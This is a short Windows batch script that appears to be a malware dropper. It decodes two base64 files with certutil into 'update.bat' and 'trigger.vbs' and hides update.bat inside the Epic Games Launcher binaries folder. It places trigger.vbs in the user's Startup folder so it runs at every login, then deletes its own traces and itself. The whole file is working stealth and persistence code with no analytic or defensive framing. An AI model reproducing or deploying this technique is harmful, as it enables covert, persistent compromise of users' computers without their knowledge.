@echo off

certutil -decode "x.b64" "update.bat" >nul
certutil -decode "z.b64" "trigger.vbs" >nul
del x.b64 >nul
del z.b64 >nul
del "C:\Program Files (x86)\Epic Games\Launcher\Engine\Binaries\Win64\update.bat" >nul
del "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.vbs" >nul
xcopy %~dp0\update.bat "C:\Program Files (x86)\Epic Games\Launcher\Engine\Binaries\Win64" >nul
xcopy %~dp0\trigger.vbs "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" >nul
start /b "" cmd /c del "%~f0"&exit /b